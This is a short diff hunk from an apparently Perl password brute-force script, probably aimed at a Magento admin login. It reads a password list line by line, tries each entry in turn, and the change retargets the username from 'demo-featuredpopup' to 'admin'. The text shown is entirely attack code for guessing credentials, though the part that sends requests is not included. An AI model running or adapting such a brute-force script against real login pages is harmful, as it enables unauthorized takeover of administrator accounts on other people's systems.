@@ -386,7 +386,7 @@ print"[-] Starting brute force";
 open(a,"<$pass") or die "$!";
 while(<a>){
 chomp($_);
-$maguser = "demo-featuredpopup";
+$maguser = "admin";
 $magpass = $_;
 print "\n[-] Trying: $magpass ";
 
